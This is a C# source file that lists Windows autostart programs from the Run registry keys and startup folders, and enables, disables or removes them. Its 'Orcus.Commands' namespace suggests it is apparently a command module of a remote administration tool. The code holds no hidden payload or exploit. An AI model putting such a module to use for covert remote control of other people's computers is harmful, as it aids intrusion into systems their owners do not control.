using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text.RegularExpressions;
using Orcus.Shared.Commands.StartupManager;
using Orcus.Utilities;

namespace Orcus.Commands.StartupManager
{
    public static class AutostartManager
    {
        public static List<AutostartProgramInfo> GetAllAutostartPrograms()
        {
            var result = new List<AutostartProgramInfo>();
            result.AddRange(RegistryAutostart.GetAutostartProgramsFromRegistryKey(AutostartLocation.HKCU_Run, true));
            result.AddRange(RegistryAutostart.GetAutostartProgramsFromRegistryKey(AutostartLocation.HKCU_Run, false));

            result.AddRange(RegistryAutostart.GetAutostartProgramsFromRegistryKey(AutostartLocation.HKLM_Run, true));
            result.AddRange(RegistryAutostart.GetAutostartProgramsFromRegistryKey(AutostartLocation.HKLM_Run, false));

            result.AddRange(RegistryAutostart.GetAutostartProgramsFromRegistryKey(AutostartLocation.HKLM_WOWNODE_Run, true));
            result.AddRange(RegistryAutostart.GetAutostartProgramsFromRegistryKey(AutostartLocation.HKLM_WOWNODE_Run, false));

            result.AddRange(FolderAutostart.GetAutostartProgramsFromFolder(AutostartLocation.ProgramData, true));
            result.AddRange(FolderAutostart.GetAutostartProgramsFromFolder(AutostartLocation.ProgramData, false));

            result.AddRange(FolderAutostart.GetAutostartProgramsFromFolder(AutostartLocation.AppData, true));
            result.AddRange(FolderAutostart.GetAutostartProgramsFromFolder(AutostartLocation.AppData, false));
            return result;
        }

        public static void ChangeAutostartEntry(AutostartLocation autostartLocation, string name, bool isEnabled)
        {
            if ((int) autostartLocation < 100)
                RegistryAutostart.ChangeAutostartEntry(autostartLocation, name, isEnabled);
            else
                FolderAutostart.ChangeAutostartEntry(autostartLocation, name, isEnabled);
        }

        public static void RemoveAutostartEntry(AutostartLocation autostartLocation, string name, bool isEnabled)
        {
            if ((int)autostartLocation < 100)
                RegistryAutostart.RemoveAutostartEntry(autostartLocation, name, isEnabled);
            else
                FolderAutostart.RemoveAutostartEntry(autostartLocation, name, isEnabled);
        }

        internal static AutostartProgramInfo CompleteAutostartProgramInfo(AutostartProgramInfo autostartProgramInfo)
        {
            FileInfo fileInfo = null;
            try
            {
                fileInfo =
                    new FileInfo(autostartProgramInfo.CommandLine.Contains("\"")
                        ? autostartProgramInfo.CommandLine.Split(new[] {'"'}, StringSplitOptions.RemoveEmptyEntries)[0]
                        //if there are quotes, they should contain the full path
                        : Regex.Match(autostartProgramInfo.CommandLine, @"^[^\/]+?(\.... |\z)").Value);
                //Match everything until / or an extension (e. g. .exe, .scr, .com) or end of line

                if (!fileInfo.Exists)
                    autostartProgramInfo.EntryStatus = EntryStatus.FileNotFound;
                else
                    autostartProgramInfo.Filename = fileInfo.FullName;
            }
            catch (Exception)
            {
                autostartProgramInfo.EntryStatus = EntryStatus.FileNotFound;
            }

            if (fileInfo?.Exists == true)
            {
                try
                {
                    autostartProgramInfo.Icon = FileUtilities.GetIconFromProcess(fileInfo.FullName);
                }
                catch (Exception)
                {
                    // happens, not that important
                }

                try
                {
                    var fileVersionInfo = FileVersionInfo.GetVersionInfo(fileInfo.FullName);
                    autostartProgramInfo.Publisher = fileVersionInfo.CompanyName;
                    autostartProgramInfo.Description = fileVersionInfo.FileDescription;

                    if (string.IsNullOrEmpty(autostartProgramInfo.Publisher) &&
                        string.IsNullOrEmpty(autostartProgramInfo.Description))
                        autostartProgramInfo.EntryStatus = EntryStatus.NoDescriptionOrCompany;
                }
                catch (Exception)
                {
                    autostartProgramInfo.EntryStatus = EntryStatus.NoDescriptionOrCompany;
                }
            }

            return autostartProgramInfo;
        }
    }
}